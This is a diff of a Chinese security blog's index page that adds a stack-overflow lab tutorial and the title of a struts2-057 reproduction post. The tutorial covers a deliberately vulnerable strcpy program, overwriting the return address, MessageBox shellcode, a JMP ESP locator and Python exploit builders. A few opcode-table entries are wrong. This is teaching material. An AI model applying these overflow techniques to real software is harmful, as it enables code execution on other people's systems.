@@ -169,27 +169,265 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-Hello-Blog" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-栈溢出简单实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/15/Hello-Blog/">Hello Blog</a>
+      <a class="article-title" href="/2018/09/02/栈溢出简单实验/">栈溢出简单实验</a>
     </h1>
   
 
         
-        <a href="/2018/08/15/Hello-Blog/" class="archive-article-date">
-  	<time datetime="2018-08-15T02:36:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-15</time>
+        <a href="/2018/09/02/栈溢出简单实验/" class="archive-article-date">
+  	<time datetime="2018-09-02T08:59:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于对于二进制方面的向往以及暂时在渗透测试领域所遇到的瓶颈问题，决定略微涉及一下二进制安全方面的内容，拓展自我的知识面，本篇文章主要讲述栈溢出漏洞，一个只要学过两天安全的人都有所耳闻的漏洞，以一个简单的案例为例进行实战练习</p>
+<h1 id="0x01-栈溢出漏洞原理"><a href="#0x01-栈溢出漏洞原理" class="headerlink" title="0x01 栈溢出漏洞原理"></a>0x01 栈溢出漏洞原理</h1><p>栈溢出顾名思义即函数动态运行时开辟出来的一块独立空间，用来存储参数，返回地址，以及局部变量等数据的一个存储空间由于恶意输入导致无法存入，从而过满溢出，就相当于一个500ml的杯子，却被倒入1000ml的饮料，必然会存在溢出的情况，栈本身是指一种数据结构，且是一种先进后出的数据结构，就相当于扑克牌，先放的会被后放的压在最下面，而拿牌的时候一般也是先拿最后的那一张，依次拿到最先的一种。栈溢出的栈是指内存栈或者是系统栈，栈在内存中是栈顶处于低内存，栈低在高内存中。</p>
+<h2 id="0x0a-函数调用过程"><a href="#0x0a-函数调用过程" class="headerlink" title="0x0a 函数调用过程"></a>0x0a 函数调用过程</h2><p>在了解栈溢出前，首先要了解一下函数的实现过程，例如mian函数调用fun_A 而fun_A调用func_B，这个过程对于高级语言，例如c语言是透明的，而对于汇编等低级语言确实不透明的，如何能够利用栈溢出，以怎样的方式去利用栈溢出，首先就要了解函数的运行调用过程。</p>
+<p><img src="\img\1536628784240.png" alt="1536628784240"></p>
+<p>除了了解一个程序的整体的执行调用过程，还要了解每一个函数在栈中存储情况</p>
+<p><img src="\img\1536567991410.png" alt=""></p>
+<h1 id="0x02-栈溢出实战"><a href="#0x02-栈溢出实战" class="headerlink" title="0x02 栈溢出实战"></a>0x02 栈溢出实战</h1><h2 id="0x0a-编写简单的测试程序"><a href="#0x0a-编写简单的测试程序" class="headerlink" title="0x0a 编写简单的测试程序"></a>0x0a 编写简单的测试程序</h2><p>作为一个初学者，以VC6为c语言编写环境，略微有点老，但是方便初学者学习，以一个简单的密码验证程序为例，源代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define PASSWORD &quot;1234567&quot;</span><br><span class="line"></span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">	int authenticated;</span><br><span class="line">	char buff[8];</span><br><span class="line">	authenticated=strcmp(password,PASSWORD);</span><br><span class="line">	strcpy(buff,password);</span><br><span class="line">	return authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	int valid_flag = 0;</span><br><span class="line">	char password[1024];</span><br><span class="line">	while(1)&#123;</span><br><span class="line">		printf(&quot;please input password: &quot;);</span><br><span class="line">		scanf(&quot;%s&quot;,password);</span><br><span class="line">		valid_flag = verify_password(password);</span><br><span class="line">		if(valid_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;incorrent password!\n\n&quot;);</span><br><span class="line">		&#125;else</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;Congratulation! You have passed the verification!\n&quot;);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下</p>
+<p><img src="\img\1535880488162.png" alt="1535880488162"></p>
+<h2 id="0x0b-修改邻近变量绕过程序"><a href="#0x0b-修改邻近变量绕过程序" class="headerlink" title="0x0b 修改邻近变量绕过程序"></a>0x0b 修改邻近变量绕过程序</h2><p>简单分析一下，在函数verify_password中buff数组存在可以溢出，覆盖到下一个authenticated变量，如果将此变量修改为0，就可以绕过程序的限制，任意输入都可以验证成功。这种溢出绕过方式是通过修改邻近变量来绕过程序，当然如果想达到任意执行的目的还需要覆盖函数返回地址。一个char类型的占1个字节，buff数组占八个字节，包括截断符null在机器中表示00），int类型占4个字节，authenticated就是一个int类型的字符，且是strcmp的结果，通常strcmp返回值为0、1、-1 ，当字符相等时返回0 ，字符串password大于PASSAWORD时返回1，字符串password小于PASSWORD时返回-1，但是翻译到机器语言中，-1是显示为fffffffe的，0显示为00000000，1显示为00000001。因此要想任意密码覆盖邻近变量还要保证password字符串大于PASSWORD字符串，因此password最起码是2开头的字符串，当输入八位字符时，就会将buff本来的最后一个截断符赋给了authenticated变量，效果如下‘</p>
+<p><img src="\img\1535968714138.png" alt="1535968714138"></p>
+<p>简单分析一下栈中情况</p>
+<p><img src="\img\1536629972622.png" alt=""></p>
+<p>这里覆盖的就是authenticated的局部变量值，具体覆盖情况如下</p>
+<table>
+<thead>
+<tr>
+<th>局部变量名</th>
+<th>内存地址</th>
+<th>偏移3处的值</th>
+<th>偏移2处的值</th>
+<th>偏移1处的值</th>
+<th>偏移0处的值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>buffer</td>
+<td>0x12FB7c</td>
+<td>0x61(‘a’)</td>
+<td>0x61(‘a’)</td>
+<td>0x61(‘a’)</td>
+<td>0x61(‘a’)</td>
+</tr>
+<tr>
+<td></td>
+<td>0x12FB80</td>
+<td>0x61(‘a’)</td>
+<td>0x61(‘a’)</td>
+<td>0x61(‘a’)</td>
+<td>0x61(‘a’)</td>
+</tr>
+<tr>
+<td>authenticated被覆盖前</td>
+<td>0x12FB84</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x01</td>
+</tr>
+<tr>
+<td>authenticated被覆盖后</td>
+<td>0x12FB84</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x00(NULL)</td>
+</tr>
+</tbody>
+</table>
+<p>通过上表及上图可以得知，将原本是字符串结束符的0x00(NULL)，通过添加多余的字符挤压到局部变量authenticated最低位就可以改变其值，从1变为0，然后返回该值，在main函数可以恒返回congratulation！</p>
+<h2 id="0x0c-修改返回地址绕过程序限制"><a href="#0x0c-修改返回地址绕过程序限制" class="headerlink" title="0x0c 修改返回地址绕过程序限制"></a>0x0c 修改返回地址绕过程序限制</h2><p>通过上小节，修改局部变量来绕过限制，本小节可以通过覆盖返回地址，只需要在上边覆盖的多覆盖三个字节就可以将返回地址覆盖，而且如果我们直接将判断正确的地址给于返回地址，则EIP指向返回地址的值时就可以直接返回正确的情况，由于正确的情况的地址为0x00401122,使用键盘无法输入该对应的字符，因此将代码稍微改动一下，使用读取文本的方式读取返回地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#define PASSWORD &quot;1234567&quot;</span><br><span class="line">int verity_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">	int authenticated;</span><br><span class="line">	char buffer[8];</span><br><span class="line">	authenticated = strcmp(password,PASSWORD);</span><br><span class="line">	strcpy(buffer,password);</span><br><span class="line">	return authenticated;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	int valid_flag = 0;</span><br><span class="line">	char password[1024];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	if(!(fp = fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))</span><br><span class="line">	&#123;</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	fscanf(fp,&quot;%s&quot;,password);</span><br><span class="line">	valid_flag = verity_password(password);</span><br><span class="line">	if(valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;incorrect password!\n&quot;);</span><br><span class="line">	&#125;else</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;Congratulation!You have passed the verification!\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数在栈中的情况与上节一致，只是原本覆盖到局部变量authenticated即可，本节需要继续扩展到返回地址，因此需要多覆盖12个字节，输入20个a就可以完全覆盖返回地址</p>
+<p><img src="\img\1536629972622.png" alt="1536629972622"></p>
+<p>先在文本输入20个a，但是为了便于分辨，可以采用输入5组4321来代替，然后使用十六进制编辑器将最后一组覆盖返回地址的值修改为正确情况的地址（0x00401122）,操作如下</p>
+<p><img src="\img\1536630326291.png" alt="1536630326291"></p>
+<p>修改保存后，再去执行程序可以看到直接返回congratulation</p>
+<p><img src="\img\1536630399954.png" alt="1536630399954"></p>
+<h2 id="0x0d-栈溢出任意命令执行"><a href="#0x0d-栈溢出任意命令执行" class="headerlink" title="0x0d 栈溢出任意命令执行"></a>0x0d 栈溢出任意命令执行</h2><p>通过0x0c节，可以覆盖返回地址，让程序执行指定的地址对应的操作，那么当然也可以让其执行构造好的恶意代码，只需要得到恶意代码的在内存中对应的地址</p>
+<p>为了满足需求，这里我们将buffer变量的存储空间变大来存储我们的shellcode（恶意代码），使覆盖地址重新跳转到buffer里边执行shellcode</p>
+<p><img src="\img\1536631085424.png" alt="1536631085424"></p>
+<p>因此我们修改下源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;              //加载调用windows组件的头文件</span><br><span class="line">#define PASSWORD &quot;1234567&quot;</span><br><span class="line">int verity_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">	int authenticated;</span><br><span class="line">	char buffer[44];                      //增加buffer字节为了承载足够的shellcode</span><br><span class="line">	authenticated = strcmp(password,PASSWORD);</span><br><span class="line">	strcpy(buffer,password);</span><br><span class="line">	return authenticated;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	int valid_flag = 0;</span><br><span class="line">	char password[1024];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	LoadLibrary(&quot;user32.dll&quot;);     //为了弹框提前加载弹框所用的dll文件</span><br><span class="line">	if(!(fp = fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))</span><br><span class="line">	&#123;</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	fscanf(fp,&quot;%s&quot;,password);</span><br><span class="line">	valid_flag = verity_password(password);</span><br><span class="line">	if(valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;incorrect password!\n&quot;);</span><br><span class="line">	&#125;else</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;Congratulation!You have passed the verification!\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过分析得到如果想覆盖到返回地址，假设以“4321”为一个单位，那么最起码也要14个单位才可以覆盖，其中buffer需要11个单位，authenticated变量需要1个单位，前栈帧需要一个，返回地址需要14个。因此在password中第53-56字节要写返回的地址,通过ollydbg分析内存地址</p>
+<table>
+<thead>
+<tr>
+<th>局部变量名</th>
+<th>内存地址</th>
+<th>偏移3处的值</th>
+<th>偏移2处的值</th>
+<th>偏移1处的值</th>
+<th>偏移0处的值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>buffer[0-3]</td>
+<td>0x0012FAF0</td>
+<td>0x31(1)</td>
+<td>0x32(2)</td>
+<td>0x33(3)</td>
+<td>0x34(4)</td>
+</tr>
+<tr>
+<td>….</td>
+<td>…</td>
+<td>0x31(1)</td>
+<td>0x32(2)</td>
+<td>0x33(3)</td>
+<td>0x34(4)</td>
+</tr>
+<tr>
+<td>buffer[40-43]</td>
+<td>0x0012FB18</td>
+<td>0x31(1)</td>
+<td>0x31(2)</td>
+<td>0x31(3)</td>
+<td>0x31(4)</td>
+</tr>
+<tr>
+<td>authenticated被覆盖前</td>
+<td>0x0012FB1C</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x01</td>
+</tr>
+<tr>
+<td>authenticated被覆盖后</td>
+<td>0x0012FB1C</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x00</td>
+<td>0x00</td>
+</tr>
+<tr>
+<td>EBP</td>
+<td>0x0012FB20</td>
+<td>0x00</td>
+<td>0x12</td>
+<td>0xFF</td>
+<td>0x80</td>
+</tr>
+<tr>
+<td>返回地址</td>
+<td>0x0012FB24</td>
+<td>0x00</td>
+<td>0x40</td>
+<td>0x11</td>
+<td>0x18</td>
+</tr>
+</tbody>
+</table>
+<p>buffer的起始地址为0x0012FAF0,因此第53-56位将写入buffer的起始地址，buffer里边写shellcode，这里的目的是为了弹框，因此要得到弹框所必须的dll函数MessageBoxA在当前系统中的内存入口地址，通过vc6自带的depends工具分析得到调用的user32.dll基地址为0x77D10000,MessageBoxA偏移地址为0x000407EA ,MessageBoxA的内存入口地址为0x77D507EA</p>
+<p><img src="\img\1536740485760.png" alt="1536740485760"></p>
+<p>此时万事俱备，只需要编写shellcode即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">33DB                          XOR EBX，EBX</span><br><span class="line">53                            PUSH EbX</span><br><span class="line">6877657374                    PUSH 74736577</span><br><span class="line">686661696C                    PUSH 6C696166   </span><br><span class="line">8BC4                          MOV EAX,ESP</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">B8EA07D577                    MOV EAX,77D507EA</span><br><span class="line">FFD0                          CALL EAX</span><br></pre></td></tr></table></figure>
+<p>使用十六进制将其写到password.txt 中，开头写shellcode机器码，第53-56写buffer的地址0x0012FAF0,中间则以0x90(nop)填充，这里可以借助python来快速编写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">shellcode1 = &apos;33DB536877657374686661696C8BC453505053B8EA07D577FFD0&apos;</span><br><span class="line">shellcode2 = &apos;90&apos;*26</span><br><span class="line">shellcode = shellcode1+shellcode2+&apos;F0FA1200&apos;     //由于是小端序，低位数保存在低位地址，所以导致写</span><br><span class="line"></span><br><span class="line">print shellcode</span><br><span class="line">print len(shellcode)</span><br></pre></td></tr></table></figure>
+<p>使用十六进制器进行编写<img src="\img\1536742887319.png" alt="1536742887319"></p>
+<p>保存再去执行下 程序就发现弹框</p>
+<p><img src="\img\1536742937735.png" alt="1536742937735"></p>
+<h2 id="0x0e-栈溢出ESP跳板定位"><a href="#0x0e-栈溢出ESP跳板定位" class="headerlink" title="0x0e 栈溢出ESP跳板定位"></a>0x0e 栈溢出ESP跳板定位</h2><p>由于0x0d小节中的改写成shellcode的起始地址是固定的，但是在实际的漏洞利用中，由于动态链接库的载入和卸载等原因，再加上不同的系统动态链接库函数在内存中的地址是不同的，windows进程的函数栈帧很有可能发生“移位”，shellcode在内存中的地址就会发生变化，因此如果单纯把返回地址覆盖为shellcode的起始地址，可能漏洞利用成功率极低，为了提高成功率，最好能够选择一个能够在程序运行中动态定位栈中的shellcode。</p>
+<p>通过观察发现，在函数返回时，ESP恰好指向栈帧中返回地址的下一个位置，因为我们可以利用ESP来定位摆放shellcode的位置</p>
+<p><img src="\img\1537328541144.png" alt="1537328541144"></p>
+<p>简单描述下整个过程：</p>
+<p>1） 首先用任意一个JMP ESP的地址来覆盖函数返回地址</p>
+<p>2） 函数返回地址被覆盖后，EIP读取到该地址后就会跳转到这条JMP ESP指令</p>
+<p>3） JMP ESP指令被执行后，处理器会到栈区函数返回地址之后的地方继续取指令执行，此时将shellcode摆放在此处，就可以执行shellcode</p>
+<p>4）因此在布置shellcode时，先将返回地址之前的用nop（0x90）来覆盖，返回地址用JMP ESP地址覆盖，返回地址之后的使用shellcode 来覆盖即可</p>
+<p>这里shellcode为了完整，之前只是弹出框无法关闭因此需要添加一个exit()函数，与弹框定位messageboxA函数一致，使用同样的方式定位exit函数，exit在kernel32.dll动态链接库文件中，且对应的函数为exitprocess()函数，得到函数入口的最终的内存地址为0x7C81CAFA,这个地址会随着不同的系统版本有变化的，自己测试的时候一定要看清楚自己的地址，避免实验无法成功</p>
+<p><img src="\img\1537329151333.png" alt="1537329151333"></p>
+<p>将shellcode基于之前的修改一下，实际上仅仅只是在后边添加上exitprocess函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">33DB                          XOR EBX，EBX</span><br><span class="line">53                            PUSH EbX</span><br><span class="line">6877657374                    PUSH 74736577</span><br><span class="line">686661696C                    PUSH 6C696166   </span><br><span class="line">8BC4                          MOV EAX,ESP</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">50                            PUSH EAX</span><br><span class="line">53                            PUSH EBX</span><br><span class="line">B8EA07D577                    MOV EAX,77D507EA</span><br><span class="line">FFD0                          CALL EAX            </span><br><span class="line">53                            PUSH EBX                //添加exit()函数</span><br><span class="line">B8FACA817C                    MOV EAX，0x7C81CAFA</span><br><span class="line">FFD0                          CALL EAX</span><br></pre></td></tr></table></figure>
+<p>编写exp，通过之前上一小节分析，得知如果覆盖到返回地址，则需要56个字节，其中第53到56字节则是对应的返回地址，其中返回地址则被覆盖为任意一个JMP ESP的地址，之前的字节则用nop(0x90)填充</p>
+<p>如何获取到任意一个地址，可以通过看学的OllyUni.dll插件，下载放在OllyDbg的plugins目录重启即可，或者可以采用以下代码定位：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	BYTE* ptr;</span><br><span class="line">	int position,address;</span><br><span class="line">	HINSTANCE handle;</span><br><span class="line">	BOOL done_flag = FALSE;</span><br><span class="line"></span><br><span class="line">	handle=LoadLibrary(DLL_NAME);</span><br><span class="line"></span><br><span class="line">	if(!handle)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot; load dll erro !&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ptr = (BYTE*)handle;</span><br><span class="line">	</span><br><span class="line">	for(position = 0; !done_flag; position++)</span><br><span class="line">	&#123;</span><br><span class="line">		try</span><br><span class="line">		&#123;</span><br><span class="line">			if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)</span><br><span class="line">			&#123;</span><br><span class="line">				//0xFFE4 is the opcode of jmp esp</span><br><span class="line">				int address = (int)ptr + position;</span><br><span class="line">				printf(&quot;OPCODE found at 0x%x\n&quot;,address);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		catch(...)</span><br><span class="line">		&#123;</span><br><span class="line">			int address = (int)ptr + position;</span><br><span class="line">			printf(&quot;END OF 0x%x\n&quot;, address);</span><br><span class="line">			done_flag = true;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中JMP ESP对应的字节码为0xFFE4，以下是常见的跳转指令与机器码的对应关系</p>
+<table>
+<thead>
+<tr>
+<th>机器码（十六进制）</th>
+<th>对应的跳转指令</th>
+<th>机器码（十六进制）</th>
+<th>对应的跳转指令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FF E0</td>
+<td>JMP EAX</td>
+<td>FF D0</td>
+<td>CALL EAX</td>
+</tr>
+<tr>
+<td>FF E1</td>
+<td>JMP ECX</td>
+<td>FF D1</td>
+<td>CALL ECX</td>
+</tr>
+<tr>
+<td>FF E2</td>
+<td>JMP EDX</td>
+<td>FF D2</td>
+<td>CALL EDX</td>
+</tr>
+<tr>
+<td>FF E3</td>
+<td>JMP EBX</td>
+<td>FF D3</td>
+<td>CALL EBX</td>
+</tr>
+<tr>
+<td>FF E4</td>
+<td>JMP ESP</td>
+<td>FF D4</td>
+<td>CALL ESP</td>
+</tr>
+<tr>
+<td>FF E5</td>
+<td>JMP EBP</td>
+<td>FF D5</td>
+<td>CALL EBP</td>
+</tr>
+<tr>
+<td>FF E6</td>
+<td>JMP ESI</td>
+<td>FF E6</td>
+<td>CALL ESI</td>
+</tr>
+<tr>
+<td>FF E7</td>
+<td>JMP EDI</td>
+<td>FF E7</td>
+<td>CALL EDI</td>
+</tr>
+</tbody>
+</table>
+<p>执行后找到其中一个JMP ESP的内存地址，例如0x77DF3B63,赋给exp的第53到56字节即可</p>
+<p><img src="\img\1537339673165.png" alt="1537339673165"></p>
+<p>使用python编写一下exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">shellcode1 = &apos;90&apos;*52</span><br><span class="line">shellcode2 = &apos;633BDF77&apos;</span><br><span class="line">shellcode3 = &apos;33DB536877657374686661696C8BC453505053B8EA07D577FFD053B8FACA817CFFD0&apos;</span><br><span class="line">shellcode = shellcode1+shellcode2+shellcode3</span><br><span class="line">print shellcode</span><br></pre></td></tr></table></figure>
+<p>将得到的shellcode通过十六进制编辑器，写到password文本，运行之前的程序</p>
+<p><img src="\img\1537340550370.png" alt="1537340550370"></p>
+<p>此时点击确定时就可以直接退出，不会遗留一个DOS界面</p>
+
       
 
       
@@ -202,7 +440,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Love</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制安全</a>
         		</li>
       		
 		</ul>
@@ -212,7 +450,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/15/Hello-Blog/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/09/02/栈溢出简单实验/">展开全文 >></a>
         </p>
       
 
@@ -242,35 +480,55 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-struts2-057复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/15/hello-world/">Hello World</a>
+      <a class="article-title" href="/2018/08/28/struts2-057复现/">struts2-057复现</a>
     </h1>
   
 
         
-        <a href="/2018/08/15/hello-world/" class="archive-article-date">
-  	<time datetime="2018-08-15T02:30:45.759Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-15</time>
+        <a href="/2018/08/28/struts2-057复现/" class="archive-article-date">
+  	<time datetime="2018-08-28T01:44:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
